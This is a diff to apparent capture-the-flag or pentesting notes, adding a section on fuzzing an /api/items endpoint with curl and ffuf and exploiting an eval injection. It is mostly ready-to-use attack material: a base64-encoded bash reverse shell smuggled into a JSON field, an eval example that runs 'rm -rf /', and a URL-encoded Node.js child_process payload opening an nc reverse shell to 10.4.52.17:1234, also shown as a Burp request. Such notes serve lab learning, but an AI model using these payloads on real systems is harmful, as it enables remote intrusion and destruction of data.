@@ -203,6 +203,42 @@ reverse shell
 --------------
 change bash reverse shell into base64
 {"target":"\" \necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjUyLjE3LzEyMzQgMD4mMQo=  | base64 -d | bash\n"}
+______________________________________________________________________________________________________________________________________________
+CURL , FFUF and eval rce
+--------------------------
+
+#curl -X POST http://10.10.229.240/api/items?sdjflkdsj=lkajfdksj | wc -c 
+
+wc -c is used to determine the http response size (response_size = 45)
+
+Parmaeter fuzzing with ffuf
+---------------------------
+
+#ffuf -w /usr/share/wordlists/dirb/common.txt -X POST -u http://10.10.229.240/api/items?FUZZ=jsdfjsf -fs 45 -mc all
+
+-fs =minimum http response_size
+-mc = match all status code
+
+
+POST /api/items?cmd=kdsjfkjdsfj HTTP/1.1 (in burpsuite)
+
+eval function
+-------------
+
+It takes a string as an argument and interprets it as a line of Python (or the respective language) code.
+
+user_input = "__import__('os').system('rm -rf /')"
+eval(user_input)
+
+user_input is not sanitized, eval function runs the user_input
+
+***Don't forget URL encoding with all space characters***
+require("child_process").exec('rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E4%2E52%2E17%201234%20%3E%2Ftmp%2Ff')
+
+In burpsuite
+-------------
+POST /api/items?cmd=require("child_process").exec('rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E4%2E52%2E17%201234%20%3E%2Ftmp%2Ff') HTTP/1.1
+
 
 
 
